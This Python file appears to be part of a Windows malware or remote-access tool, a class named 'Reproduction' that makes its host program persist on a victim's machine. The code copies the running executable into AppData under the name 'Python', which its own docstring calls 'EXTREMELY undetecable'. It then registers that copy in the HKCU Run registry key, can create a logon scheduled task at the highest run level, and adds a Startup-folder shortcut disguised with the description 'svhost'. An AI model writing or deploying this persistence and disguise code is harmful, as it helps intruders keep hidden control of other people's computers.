import getpass
import os
import shutil
import subprocess
import sys
import winshell

from tools.code_execution import run_cmd_command


class Reproduction:
    def __init__(self):
        # It is not needed
        pass

    @staticmethod
    def create_scheduled_task(script_path, task_name='Python'):
        # Create a batch file that runs the script
        batch_file_path = os.path.join(os.environ['TEMP'], f'{task_name}.bat')
        with open(batch_file_path, 'w') as batch_file:
            batch_file.write('@echo off\n')
            batch_file.write(':: Run the script with elevated privileges\n')
            batch_file.write(f'"{script_path}"')

        # Create the scheduled task
        task_cmd = f'schtasks /create /tn "{task_name}" /tr "{batch_file_path}" /sc ONLOGON /ru {getpass.getuser()} /rl HIGHEST'
        subprocess.run(task_cmd, shell=True, check=True)

        print(f'Scheduled task "{task_name}" created successfully. Command: {task_cmd}')

    def copy_self_to_temp(self, new_exe_name='Python'):
        """
        Copy the current executable to a temporary directory and inject it into the registry.

        Parameters:
            new_exe_name (str): The name of the new executable file (default is 'Python' to be EXTREMELY undetecable).

        Returns:
            None

        Raises:
            Exception: If there is an error while copying the executable.
        """
        try:
            exe_path = sys.executable

            # Get the name of the executable
            # exe_name = os.path.basename(exe_path)

            # Get the temp directory in appdata
            temp_dir = os.path.join(os.getenv('APPDATA'), 'temp')

            # Check if the executable is already in the appdata folder
            if not exe_path.startswith(temp_dir):
                # Create the temp directory if it does not exist
                os.makedirs(temp_dir, exist_ok=True)

                # Define the destination path with the new name
                dest_path = os.path.join(temp_dir, f"{new_exe_name}.exe")

                # Copy the executable to the destination path and rename it
                shutil.copy2(exe_path, dest_path)

                print(f'Copied {exe_path} to {dest_path} as {new_exe_name}.exe')

                self._inject_to_registry(dest_path, new_exe_name)

                # self.create_scheduled_task(dest_path)

                # Start the new application
                new_app_path = os.path.join(temp_dir, f"{new_exe_name}.exe")
                subprocess.Popen(new_app_path)

                # Terminate the current application
                sys.exit()
        except Exception as e:
            print(f"Error copying executable: {e}")

    @staticmethod
    def _inject_to_registry(dest_path, new_exe_name):
        """
        Injects a new executable into the Windows Registry as a startup item.

        Args:
            dest_path (str): The path of the executable file to be added as a startup item.
            new_exe_name (str): The name of the startup item.

        Returns:
            None

        Raises:
            Exception: If there is an error while injecting the executable into the Windows Registry.
        """
        try:
            # Build a Windows Registry command to add a startup item
            command = (
                # Specify the registry key to add the startup item to
                f'reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
                f'/v {new_exe_name} '  # Set the name of the startup item (e.g., "WindowsUpdate")
                f'/t REG_SZ '  # Specify the data type for the registry value (REG_SZ for string)
                f'/d "{dest_path}" '  # Set the data value to be the path of the executable enclosed in double quotes
                f'/f'  # Force the update of the registry value even if it already exists ("/f" flag)
            )

            print(f"Trying to inject into REG... Path: {dest_path} Name: {new_exe_name} Command: {command}")

            output = run_cmd_command(command)
            print(f"Tried to inject into REG. Output: {output}")
        except Exception as e:
            print(f"Error injecting into REG: {e}")

    @staticmethod
    def add_to_startup(path):
        """
        Create a shortcut to the given executable and add it to the Windows Startup folder.

        Args:
            path (str): Path to the executable to be added to startup.
        """
        # Get the Startup folder
        startup_folder = winshell.startup()

        # Get the name of the executable
        exe_name = os.path.basename(path)

        # Define the destination path for the shortcut
        dest_path = os.path.join(startup_folder, exe_name + '.lnk')

        # Create a shortcut
        winshell.CreateShortcut(
            Path=dest_path,
            Target=path,
            Icon=(path, 0),
            Description="svhost"
        )

        print(f'Added {path} to startup programs.')
